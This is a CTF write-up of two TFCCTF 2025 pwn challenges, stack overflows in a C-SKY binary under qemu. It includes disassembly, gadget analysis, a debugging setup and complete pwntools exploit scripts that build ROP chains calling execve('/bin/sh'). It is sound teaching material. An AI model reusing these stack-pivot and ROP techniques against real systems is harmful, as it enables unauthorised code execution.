---
# example: UIUCTF 25 - ELF Capsule
title: TFCCTF 25 - Cromozominus Rex

# date of publication/creation
date: '2025-09-02T11:56:22+02:00'

# add link to your original blog post
upstream: ""

# set to true to use mathjax
math: false

# for ctf writeups add the category for the ctf event
# --> name of ctf + short year (example uiuctf25)
categories:
- tfcctf25
- writeup

# tag names should be mostly lowercase
# please reuse tags if possible (https://theromanxpl0.it/tags/)
tags:
  # - reverse
  # - crypto
  # - forensics
  # - misc
  - pwn
  # - web
  # - fullpwn
  # - hardware
  # - infra
  # ecc ecc.
  - C-SKY
  - rop
  - overflow

# you can put more than one
# please use the standard name in content/members
authors:
- nect
---

![card](/tfcctf25/cromo/card.png)

<br>

This challenge was the followup of **Mucusuki**,
with only an additional check on the payload.\
Since the programs are 99% identical, let's start by analyzing the first one.


## Mucusuki

In the attachments we find two binaries: `mucusuki` and `qemu`.
There's also a Dockerfile, which will be invaluable for the debugging step later.

As you might have imagined due to qemu, this is not the usual x86 binary.
Let's see:

```
ELF 32-bit LSB executable, C-SKY processor family, version 1 (SYSV), statically linked, stripped
```

[C-SKY](https://c-sky.github.io/) is a 32-bit chinese ISA based on RISC-V.
But other than that, the challenge is a Linux userland program.

Unfortunately Ida did not support the C-SKY architecture, so we used ghidra with a [plugin](https://github.com/leommxj/ghidra_csky).\
Here are a few excerpts of the decompiled code:

```c
undefined4 entry(void)
{
  undefined4 uVar1;

  get_input();
  puts("Goodbye!\n");
  uVar1 = exit(0);
  return uVar1;
}
```

```c
undefined4 get_input(void)
{
  undefined4 uVar1;
  undefined auStack_6c [100];

  write(1,"Give me something to read:\n",0x1b);
  uVar1 = read(0,auStack_6c,0x100);
  return uVar1;
}
```

We can see that the stack buffer is `100` bytes, but the program reads `0x100`.
A classic stack buffer overflow.

```c
undefined4 syscall(undefined4 param_1,undefined4 param_2)
{
  trap_exception(0);
  return param_2;
}
```

System calls are triggered with `trap 0` in CSKY.

Now that we found the overflow, we can start ropping.
But first we need to study the architecture a bit.

### C-SKY 101

There are a lot of registers, but we care only about a handful:

|Register|Usage      |
|--------|-----------|
|`r0` |First argument|
|`r1` |Second argument|
|`r2` |Third argument|
|`r3` |Fourth argument|
|`r7` |Syscall number|
|`r8` |Base pointer|
|`r14`|Stack pointer|
|`r15`|Link register (return address)|

The return instruction on C-SKY (`rts`) does not pop
the address from the stack, but jumps on the link register.\
So we need to find gadgets that pop to `r15` for the ROP chain.

Another important fact: the stack is not randomized.
Every program execution got the same stack addresses (around `0x3ffff000`).
I did find a slight address discrepancy when running on Docker though.

> Note that in both challenges the stack is executable.\
> I already started with the ROP route, but in mucusuki
> you could put shellcode in the buffer.

### The syscall gadget

While the decompiled code is useful to get an overview of the program,
to ROP we need to get to the assembly.
Since my objdump did not support C-SKY, I just disassembled from gdb.

To help you understand the assembly I commented a bit the instructions:

```asm
// get_input
0x8150:	subi      	r14, r14, 8            // alloc 8 bytes in stack
0x8152:	st.w      	r15, (r14, 0x4)        // store link (retptr) in stack
0x8156:	st.w      	r8, (r14, 0x0)         // store base in stack
0x815a:	mov      	r8, r14                // rbp <- rsp
0x815c:	subi      	r14, r14, 100          // alloc 100 bytes in stack (buf)
0x815e:	movi      	r2, 27
0x8160:	lrw      	r1, 0x8424	// 0x8198  // string addr
0x8162:	movi      	r0, 1
0x8164:	bsr      	0x82dc	// 0x82dc      // call write
0x8168:	lsli      	r0, r0, 0              // nop
0x816c:	subi      	r3, r8, 100            // buf addr (relative to base)
0x8170:	movi      	r2, 128
0x8172:	lsli      	r2, r2, 1              // 128 << 1 = 0x100
0x8174:	mov      	r1, r3
0x8176:	movi      	r0, 0
0x8178:	bsr      	0x828c	// 0x828c      // call read
0x817c:	lsli      	r0, r0, 0              // nop
0x8180:	mov      	r0, r0
0x8182:	mov      	r14, r8                // restore base stack
0x8184:	ld.w      	r15, (r14, 0x4)        // load old link reg
0x8188:	ld.w      	r8, (r14, 0x0)         // load old base reg
0x818c:	addi      	r14, r14, 8            // dealloc 8 bytes
0x818e:	rts                                // return (r15 addr)
```

Now that you've got the gist of it, let's see the `syscall` function:

```asm
// syscall
0x8208:	subi      	r14, r14, 8
0x820a:	st.w      	r8, (r14, 0x4)
0x820e:	st.w      	r7, (r14, 0x0)
0x8210:	mov      	r8, r14
0x8212:	subi      	r14, r14, 16
0x8214:	subi      	r12, r8, 4
0x8218:	st.w      	r0, (r12, 0x0)  // store r0 (sysnr) in stack
0x821c:	subi      	r0, r8, 8
0x8220:	st.w      	r1, (r0, 0x0)   // store r1 (arg1) in stack
0x8222:	subi      	r1, r8, 12
0x8226:	st.w      	r2, (r1, 0x0)   // store r2 (arg2) in stack
0x8228:	subi      	r2, r8, 16
0x822c:	st.w      	r3, (r2, 0x0)   // store r3 (arg3) in stack
0x822e:	subi      	r3, r8, 8
0x8232:	ld.w      	r0, (r3, 0x0)   // load r8-8 (arg1) to r0
0x8234:	subi      	r3, r8, 12
0x8238:	ld.w      	r1, (r3, 0x0)   // load r8-12 (arg2) to r1
0x823a:	subi      	r3, r8, 16
0x823e:	ld.w      	r2, (r3, 0x0)   // load r8-16 (arg3) to r2
0x8240:	subi      	r3, r8, 4
0x8244:	ld.w      	r12, (r3, 0x0)  // load r8-4 (sysnr) to r12
0x8248:	andi      	r3, r12, 255
0x824c:	subi      	r3, 21          // sub 21 from the sysnr
0x824e:	mov      	r7, r3          // move sysnr to r7
0x8250:	trap      	0               // exec syscall
0x8254:	mov      	r3, r0
0x8256:	mov      	r0, r3
0x8258:	mov      	r14, r8
0x825a:	ld.w      	r8, (r14, 0x4)
0x825e:	ld.w      	r7, (r14, 0x0)
0x8260:	addi      	r14, r14, 8
0x8262:	rts
```

As we can see this function does a bit more manipulation than what ghidra decompiled.\
Let's rewrite it in pseudo code:

```c
undefined syscall(sysnr, arg1, arg2, arg3)
{
    int tmp[4];   // r8-4
    tmp[0] = sysnr;
    tmp[1] = arg1;
    tmp[2] = arg2;
    tmp[3] = arg3;
    r0 = tmp[1];
    r1 = tmp[2];
    r3 = tmp[3];
    r7 = (tmp[0] & 255) - 21;
    trap_exception(0);
}
```

To swap the registers appropriately for the syscall calling convention, they are stored and loaded from the stack.\
Thus, we can store the register values that we want in the stack and jump in the middle of the function.

### The exploit

With gdb we can figure out the fixed stack position of the input buffer.
The simplest way is adding a breakpoint to the `read` call and printing the registers:

![gdb1](/tfcctf25/cromo/gdb1.png)

I found [here](https://gpages.juszkiewicz.com.pl/syscalls-table/syscalls.html)
that the syscall number for `execve` is `221` on C-SKY.

Since we can overwrite the stack base pointer, we can pivot the stack to an offset within our injected data.\
The following payload calls `syscall(221+21, "/bin/sh", 0, 0)`:

```py
def main():
    r = conn()

    # r8-16 : r2  -> arg2
    # r8-12 : r1  -> arg1
    # r8-8  : r0  -> arg0
    # r8-4  : r12 -> syscall_no+21
    stack = 0x3ffffecc

    payload = fit({
        0: p32(0),
        4: p32(0),
        8: p32(stack+32),
        12: p32(221+21), #execve
        32: b"/bin/sh\0",
    })

    payload = payload.ljust(100, b'\0')
    payload += p32(stack+16)  # set stack
    payload += p32(0x822e)    # set retptr

    r.sendlineafter(b"read:", payload)
    r.interactive()
```

Finally we can get that flag:

```
TFCCTF{t0_beat_mcsky_y0u_had_to_csky_now_go_after_cromozominus}
```

Let's follow this advice and move on to cromozominus.

## Cromozominus Rex

The program is the same except for the `get_input` function.\
A huge if statement was added to check if disallowed bytes were present in the buffer.
If they are found, the function calls exit instead of returning,
skipping our ROP chain.


```c
// get_input @ 0x00823c
void get_input(void)
{
  int len;
  byte buffer[100];
  uint c;
  int max_loop;
  int idx;

  write(1,"Give me something to read:\n",0x1b);
  len = read(0,buffer,0x100);

  max_loop = len;
  for (idx = 0; idx < max_loop; idx = idx + 1) {
    c = (uint)buffer[idx];

    if (((((((((c == 1) || (c == 2)) || (c == 3)) ||
            ((c == 6 || (c == 7)))) ||
           ((((((c == 9 || ((c == 10 || (c == 0xb)))) || (c == 0xd)) ||
              ((((c == 0xe || (c == 0xf)) || (c == 0x11)) ||
               (((c == 4 || (c == 0x13)) ||
                ((c == 0x14 || ((c == 0x15 || (c == 0x16)))))))))) ||
             (((c == 0x1d ||
               ((((c == 0x1e || (c == 0x1f)) || (c == 0x20)) ||
                ((c == 0x21 || (c == 0x22)))))) ||
              ((c == 0x23 || ((c == 0x2a || (c == 0x2b)))))))) ||
            (c == 0x2d)))) ||
          ((((((((c == 0x30 || (c == 0x31)) || (c == 0x32)) ||
               ((c == 0x34 || (c == 0x3a)))) || (c == 0x3b)) ||
             ((c == 0x3d || (c == 0x40)))) ||
            ((c == 0x42 || (((c == 0x48 || (c == 0x4b)) || (c == 0x4e)))
             ))) || (((((c == 0x50 || (c == 0x54)) || (c == 0x5a)) ||
                      ((c == 0x5b || (c == 0x5d)))) ||
                     ((((c == 0x5f ||
                        (((c == 0x60 || (c == 99)) || (c == 0x6a)))) ||
                       ((c == 0x6b || (c == 0x6d)))) || (c == 0x6f)))))))) ||
         (((c == 0x72 || (c == 0x78)) ||
          ((c == 0x7b ||
           ((((c == 0x7e || (c == 0x7f)) || (c == 0x80)) ||
            ((c == 0x84 || (c == 0x8a)))))))))) ||
        (((c == 0x8b || ((c == 0x8d || (c == 0x8f)))) ||
         ((((c == 0x90 || (((c == 0x95 || (c == 0x9a)) || (c == 0x9b))))
           || (((c == 0x9d || (c == 0x9f)) || (c == 0xa2)))) ||
          (((c == 0xa5 || (c == 0xab)) ||
           ((c == 0xad || (((c == 0xaf || (c == 0xb2)) || (c == 0xb5))))
           )))))))) ||
       ((((c == 0xbb || (c == 0xbd)) ||
         ((c == 0xbf ||
          (((((c == 0xc2 || (c == 200)) ||
             ((c == 0xcb ||
              ((((c == 0xcd || (c == 0xce)) || (c == 0xd2)) ||
               ((c == 0xd4 || (c == 0xd5)))))))) || (c == 0xd9)) ||
           ((c == 0xda || (c == 0xdf)))))))) ||
        ((((c == 0x18 || (((c == 0xe4 || (c == 0xe5)) || (c == 0xe9))))
          || (((c == 0xed || (c == 0xee)) || (c == 0xf1)))) ||
         ((c == 0xf2 || (c == 0xfa)))))))) {
      exit(0);
    }
  }
}
```

Here's the list of the 98 disallowed values:
```py
[ 1, 2, 3, 6, 7, 9, 10, 0xb, 0xd, 0xe, 0xf, 0x11, 4, 0x13, 0x14, 0x15, 0x16, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x2a, 0x2b, 0x2d, 0x30, 0x31, 0x32, 0x34, 0x3a, 0x3b, 0x3d, 0x40, 0x42, 0x48, 0x4b, 0x4e, 0x50, 0x54, 0x5a, 0x5b, 0x5d, 0x5f, 0x60, 99, 0x6a, 0x6b, 0x6d, 0x6f, 0x72, 0x78, 0x7b, 0x7e, 0x7f, 0x80, 0x84, 0x8a, 0x8b, 0x8d, 0x8f, 0x90, 0x95, 0x9a, 0x9b, 0x9d, 0x9f, 0xa2, 0xa5, 0xab, 0xad, 0xaf, 0xb2, 0xb5, 0xbb, 0xbd, 0xbf, 0xc2, 200, 0xcb, 0xcd, 0xce, 0xd2, 0xd4, 0xd5, 0xd9, 0xda, 0xdf, 0x18, 0xe4, 0xe5, 0xe9, 0xed, 0xee, 0xf1, 0xf2, 0xfa ]
```

I tried to adapt the payload of the previous challenge.
Unfortunately the address of the syscall gadget (`0x8806`) contained a forbidden byte.
Furthermore, the syscall number for execve was also blocked :face_holding_back_tears:

Apparently these were collateral victims, and the author did not block them for this reason...

![ds](/tfcctf25/cromo/discord.png)

<br>

Let's move on.
Since this time our ret2win gadget is unavailable, we'll need to craft a proper ROP chain.

### The chain

My first idea was to use the `sigreturn` syscall to setup the registers for an `execve`.
After reading a bit of the Linux [source code][linux], I gave up on that.

At this point, I was thinking of splitting the payload and calling read a second time.\
I noticed in the `read` function a pattern very similar to that found
in the `syscall` gadget: registers are stored on the stack when being swapped around.

```asm
// read
0x8864:	subi      	r14, r14, 8
0x8866:	st.w      	r15, (r14, 0x4)
0x886a:	st.w      	r8, (r14, 0x0)
0x886e:	mov      	r8, r14
0x8870:	subi      	r14, r14, 12
0x8872:	subi      	r3, r8, 4
0x8876:	st.w      	r0, (r3, 0x0)
0x8878:	subi      	r3, r8, 8
0x887c:	st.w      	r1, (r3, 0x0)
0x887e:	subi      	r3, r8, 12
0x8882:	st.w      	r2, (r3, 0x0)
0x8884:	subi      	r3, r8, 8
// read gadget
0x8888:	ld.w      	r2, (r3, 0x0)
0x888a:	subi      	r3, r8, 12
0x888e:	subi      	r1, r8, 4
0x8892:	ld.w      	r3, (r3, 0x0)
0x8894:	ld.w      	r1, (r1, 0x0)
0x8896:	movi      	r0, 84
0x8898:	bsr      	0x87e0	// 0x87e0    // syscall
0x889c:	lsli      	r0, r0, 0
0x88a0:	mov      	r3, r0
0x88a2:	mov      	r0, r3
0x88a4:	mov      	r14, r8
0x88a6:	ld.w      	r15, (r14, 0x4)
0x88aa:	ld.w      	r8, (r14, 0x0)
0x88ae:	addi      	r14, r14, 8
0x88b0:	rts
```

Thus, I started looking for suitable gadgets in the the whole program.

+ This gadget pops from the stack `r8`, then stores that value in `r3`.
    ```asm
    // setr3 gadget
    0x87c0:	ld.w      	r15, (r14, 0x4)
    0x87c4:	ld.w      	r8, (r14, 0x0)
    0x87c8:	mov      	r3, r8
    0x87ca:	addi      	r14, r14, 8
    0x87cc:	mov      	r8, r14
    0x87ce:	rts
    ```

+ This one simply pops the base pointer `r8` and returns.
    ```asm
    // ret gadget
    0x88a6:	ld.w      	r15, (r14, 0x4)
    0x88aa:	ld.w      	r8, (r14, 0x0)
    0x88ae:	addi      	r14, r14, 8
    0x88b0:	rts
    ```

### Debugging

This was one of the first times I tried a challenge in an exotic architecture (reading as, not x86).
Debugging this kind of challenge is always hard, as pwntools' `gdb.attach` simply won't work.

So I spent quite a bit of time preparing a comfortable gdb setup.
Since this helped me immensely, I think it's worth sharing.

First of all, I exposed a port for qemu's gdbserver:
```Dockerfile
EXPOSE 1235/tcp
CMD ["socat","-d","-d","-x","TCP-LISTEN:1337,reuseaddr,fork","EXEC:env -i ./qemu -g 1235 ./crorex,stderr,setsid"]
```

Then in my solve script I added a command to spawn a terminal with gdb:
```py
with open('args.gdb','w') as f:
    f.write(GDB_ARGS)
    f.write("set architecture csky\n")
    f.write("target remote localhost:1235\n")

process(context.terminal + ["sh", "-c", f"sleep 1; sudo gdb -x args.gdb {e.path}"])
```

Another point of frustration was that C-SKY is not supported by `pwndbg`.
To mitigate the pain of using the tui layout and default commands,
I made a small script to help me associate addresses with function names.

```py
syms = {
    "get_input": (0x000823c, 0x8770),
    "entry": (0x8778, 0x87ae),
    "syscall": (0x087e0, 0x883a),
    "syscall_noret": (0x0883c, 0x8860),
    "read": (0x08864, 0x88b0),
    "write": (0x000088b4, 0x8900),
    "exit": (0x0008904, 0x8936),
    "strlen": (0x08938, 0x8986),
    "puts": (0x008988, 0x89ca),
}

with open("sym.S", "w") as f:
    f.write("""
        .text
    """)
    for sym, (start, end) in syms.items():
        end+=1
        f.write(f"""
        .globl {sym}
        .type {sym}, @function
        .org {start:#x}
    {sym}:
        .space ({end:#x}-{start:#x})
        .size {sym}, {end:#x}-{start:#x}
        """)

import os
os.system("as -g sym.S -o sym.o")
```

This script produces an object file that can be loaded with `add-symbol-file sym.o 0x0`.

![gdb2](/tfcctf25/cromo/gdb2.png)

Now we can see where the exploit is jumping around :wink:

### Final script

This is the flow of the first payload:
1) setup the buffer with fd (`0`), size (`0xff`) and buffer address
2) set r3 to the buffer address + 16
3) set r8 to the buffer address + 16
4) call the read gadget
5) do the second stage (basically the same as *mucusuki*)

```py
from pwn import *

e = ELF("./crorex")
context.terminal = ["alacritty","-e"]

GDB_ARGS="""
layout asm
layout regs
add-symbol-file sym.o 0x0
b get_input
b exit
b *0x8738
b *0x8936
b *0x8770
"""

def conn():
    if args.LOCAL:
        r = process(["./qemu", "-g", "1235", e.path], env={})
    else:
        if args.DOCKER:
            nc = "localhost 1337"
            ssl = False
        else:
            nc = "ncat --ssl crorex-e073519243d25f48.challs.tfcctf.com 1337"
            ssl = True

        addr, port = nc.strip().split()[-2:]
        r = remote(addr, port, ssl=ssl)

    if args.GDB:
        with open('args.gdb','w') as f:
            f.write(GDB_ARGS)
            f.write("set architecture csky\n")
            f.write("target remote localhost:1235\n")

        process(context.terminal + ["sh", "-c", f"sleep 1; sudo gdb -x args.gdb {e.path}"])

    return r

def main():
    r = conn()

    stack = 0x3ffffebc

    payload = fit({
        16 - 12: p32(0xff),
        16 - 4: p32(0),
        16 - 0: p32(stack),
    }, filler = b'\0')

    payload = payload.ljust(112, b'\0')
    payload += p32(0)
    payload += p32(stack) #rbp

    # set r3
    payload += p32(0x87c0)
    payload += p32(stack+16)

    # set r8
    payload += p32(0x88a6)
    payload += p32(stack+16)

    # read
    # [r3-0] -> buf
    # [r8-12] -> size
    # [r8-4] -> fd
    payload += p32(0x8888)

    r.sendafter(b"read:", payload)

    ### SECOND PAYLOAD ###
    pause(2)

    payload = fit({
        0: p32(0),
        4: p32(0),
        8: p32(stack+32),
        12: p32(221+21), #execve
        32: b"/bin/sh\0",
    })

    payload = payload.ljust(132, b'\0')
    payload += p32(stack+140)
    payload += p32(stack+140)
    payload += p32(stack+16)
    payload += p32(0x8806)

    r.send(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

I finished the script and got the flag at 4AM :pray:

```
TFCCTF{cromozominus_pulisaki_in_redacted_cro++_crorex_crovid}
```

[linux]: https://elixir.bootlin.com/linux/v6.16.3/source/arch/csky/kernel/signal.c#L69
